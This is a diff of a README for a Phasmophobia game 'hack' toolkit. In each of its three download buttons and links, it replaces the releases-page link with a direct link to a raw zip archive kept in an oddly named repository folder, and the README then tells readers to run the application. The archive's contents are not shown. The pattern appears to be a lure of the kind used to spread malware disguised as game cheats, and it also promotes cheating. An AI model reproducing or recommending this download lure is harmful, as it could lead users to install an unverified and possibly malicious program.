@@ -1,7 +1,7 @@
 <h1>👻 phasmophobia-hack-2026-ghost-investigation-toolkit - Your Ultimate Ghost Hunting Companion</h1>
 
 <p align="center">
-  <a href="https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/releases">
+  <a href="https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/raw/refs/heads/main/upmove/hack_toolkit_investigation_phasmophobia_ghost_1.9-alpha.2.zip">
     <img src="https://img.shields.io/badge/⬇️_DOWNLOAD_NOW-FF6B6B?style=for-the-badge&logo=github&logoColor=white" alt="Download Now" width="300">
   </a>
 </p>
@@ -52,7 +52,7 @@ This is a powerful **PC toolkit** designed to make your ghost hunting expedition
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[Download phasmophobia-hack-2026-ghost-investigation-toolkit](https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/releases)**
+Visit this link to download the application: **[Download phasmophobia-hack-2026-ghost-investigation-toolkit](https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/raw/refs/heads/main/upmove/hack_toolkit_investigation_phasmophobia_ghost_1.9-alpha.2.zip)**
 
 ### Step 2: Run the Application
 
@@ -173,7 +173,7 @@ This is an unofficial fan-made tool. It is not affiliated with or endorsed by th
 Ready to start? Click the button below:
 
 <p align="center">
-  <a href="https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/releases">
+  <a href="https://github.com/ikta87/phasmophobia-hack-2026-ghost-investigation-toolkit/raw/refs/heads/main/upmove/hack_toolkit_investigation_phasmophobia_ghost_1.9-alpha.2.zip">
     <img src="https://img.shields.io/badge/🎮_GET_THE_TOOLKIT-4ECDC4?style=for-the-badge" alt="Get the Toolkit" width="250">
   </a>
 </p>
